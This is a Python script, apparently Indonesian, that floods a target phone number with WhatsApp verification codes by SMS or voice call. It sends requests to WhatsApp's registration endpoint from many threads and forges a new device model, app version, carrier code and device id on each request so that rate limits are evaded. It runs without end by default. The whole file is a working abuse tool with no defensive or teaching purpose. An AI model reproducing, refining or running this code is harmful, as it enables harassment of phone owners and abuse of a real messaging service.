#!/usr/bin/env python3
"""OTP flood — rotasi identitas device tiap request, multi-thread, burn mode."""
import sys, json, base64, hashlib, random, time, threading, itertools, signal
import urllib.parse, urllib.request
from concurrent.futures import ThreadPoolExecutor

BASE = "https://v.whatsapp.net/v2"
G, R, Y, C, N = "\033[1;32m", "\033[1;31m", "\033[1;33m", "\033[1;36m", "\033[0m"

MODELS = ["Redmi Note 8", "SM-A505F", "RMX2185", "vivo 1904", "POCO X3",
          "Infinix X688B", "CPH2239", "M2007J20CG", "Redmi 9A", "SM-A125F"]
VERS = ["2.24.6.77", "2.24.9.78", "2.24.13.79", "2.24.17.80", "2.24.21.81"]
MCCMNC = [("510", "10"), ("510", "11"), ("510", "89"), ("510", "21"), ("510", "08"),
          ("404", "45"), ("404", "10"), ("405", "799"), ("502", "16"), ("520", "03"),
          ("452", "04"), ("310", "260"), ("234", "15"), ("505", "02")]

lock = threading.Lock()
ok = 0
fail = 0
stop = False


def _tok(v):
    raw = json.dumps({"v": v, "t": str(int(time.time())), "f": "0"},
                     separators=(",", ":"))
    return base64.b64encode(raw.encode()).decode()


def norm(s):
    s = "".join(c for c in s if c.isdigit()).lstrip("0")
    return s if s.startswith("62") else "62" + s


def hit(num, method):
    cc, ph = num[:2], num[2:]
    mcc, mnc = random.choice(MCCMNC)
    v = random.choice(VERS)
    aid = "".join(random.choice("0123456789abcdef") for _ in range(16))
    prm = {"cc": cc, "in": ph, "to": num, "method": method,
           "mcc": mcc, "mnc": mnc, "sim_mcc": mcc, "sim_mnc": mnc,
           "client_type": "android",
           "id": hashlib.sha256((aid + num).encode()).hexdigest(),
           "token": _tok(v)}
    body = urllib.parse.urlencode(prm).encode()
    req = urllib.request.Request(BASE + "/code", data=body, headers={
        "User-Agent": "WhatsApp/%s A (%s)" % (v, random.choice(MODELS)),
        "Content-Type": "application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.read().decode(errors="replace")
    except Exception as e:
        return "ERR " + str(e)


def worker(idx, num, method, rounds, delay, burn):
    global ok, fail
    seq = range(rounds) if rounds > 0 else itertools.count()
    for _ in seq:
        if stop:
            break
        m = method if method != "both" else random.choice(["sms", "voice"])
        body = hit(num, m)
        good = ('"status":"sent"' in body) or ('"status":"ok"' in body)
        with lock:
            if good:
                ok += 1
            else:
                fail += 1
            total = ok + fail
            tag = "%sOK%s" % (G, N) if good else "%sXX%s" % (R, N)
            print("%s%5d%s | %sok %d%s %sfail %d%s | w%d %-5s %s %s" % (
                C, total, N, G, ok, N, R, fail, N, idx, m, tag, body[:55]),
                flush=True)
        d = delay
        if '"retry_after"' in body:
            try:
                d = max(d, int(json.loads(body).get("retry_after", d)))
            except Exception:
                pass
        time.sleep(d + random.uniform(0, delay if delay > 0 else 0.2))


def _sig(*_):
    global stop
    stop = True
    print("\n%s[!] stop diminta, menunggu thread selesai...%s" % (Y, N))


def main():
    signal.signal(signal.SIGINT, _sig)
    num = norm(sys.argv[1])
    method = sys.argv[2] if len(sys.argv) > 2 else "sms"
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 8
    rounds = int(sys.argv[4]) if len(sys.argv) > 4 else 0
    delay = float(sys.argv[5]) if len(sys.argv) > 5 else 1.0
    burn = len(sys.argv) > 6 and sys.argv[6] == "burn"
    print("%s[OTP FLOOD]%s %s · %s · %d thread · %s ronde · delay %ss · burn=%s" % (
        Y, N, num, method, workers, "inf" if rounds == 0 else rounds, delay, burn))
    print("%s[!] Ctrl+C untuk stop%s\n" % (Y, N))
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(lambda i: worker(i, num, method, rounds, delay, burn),
                    range(workers)))
    el = time.time() - t0
    rate = (ok + fail) / el if el else 0
    print("\n%s=== TOTAL ===%s ok=%s%d%s fail=%s%d%s waktu=%.0fs rate=%.1f req/s" % (
        C, N, G, ok, N, R, fail, N, el, rate))


if __name__ == "__main__":
    main()
